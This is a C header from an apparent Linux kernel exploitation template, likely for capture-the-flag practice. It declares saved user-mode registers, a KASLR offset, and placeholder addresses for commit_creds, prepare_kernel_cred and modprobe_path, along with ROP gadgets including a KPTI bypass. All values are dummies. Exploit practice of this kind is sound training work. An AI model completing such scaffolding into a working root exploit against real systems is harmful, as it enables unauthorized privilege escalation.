#ifndef __KPWN_VARS_H
#define __KPWN_VARS_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef DEFINE_GLOBALS
#define GLOBAL
#define INIT(x) = x
#else
#define GLOBAL extern
#define INIT(x)
#endif

/* ------------------- uneditable ------------------- */
#define DUMMY_VALUE (0xdddddddddddddddd)
#define default_kbase (0xffffffff81000000)
#define kbase_offset (kbase - default_kbase)
GLOBAL cpu_set_t t1_cpu, t2_cpu;
GLOBAL uint64_t user_cs, user_ss, user_rsp, user_rflags;
GLOBAL uint64_t kbase INIT(default_kbase);
GLOBAL uint64_t kheap INIT(0);

/* -------------------- editable -------------------- */
// addresses
#define addr_prepare_kernel_cred (DUMMY_VALUE + kbase_offset)
#define addr_init_cred (DUMMY_VALUE + kbase_offset)
#define addr_commit_creds (DUMMY_VALUE + kbase_offset)
#define addr_modprobe_path (DUMMY_VALUE + kbase_offset)

// gadgets
#define pop_rdi_ret (DUMMY_VALUE + kbase_offset)
#define pop_rcx_ret (DUMMY_VALUE + kbase_offset)
#define mov_rdi_rax_rep_ret (DUMMY_VALUE + kbase_offset)
#define bypass_kpti (DUMMY_VALUE + kbase_offset)
#define mov_prdx_rcx_ret (DUMMY_VALUE + kbase_offset)
#define mov_rax_prdx_ret (DUMMY_VALUE + kbase_offset)
#define mov_esp_0x39000000_ret (DUMMY_VALUE + kbase_offset)
#define addr_rsp_0x140_pop6_ret (DUMMY_VALUE + kbase_offset)

// config variables
GLOBAL bool kaslr INIT(true);

#endif  // __KPWN_VARS_H
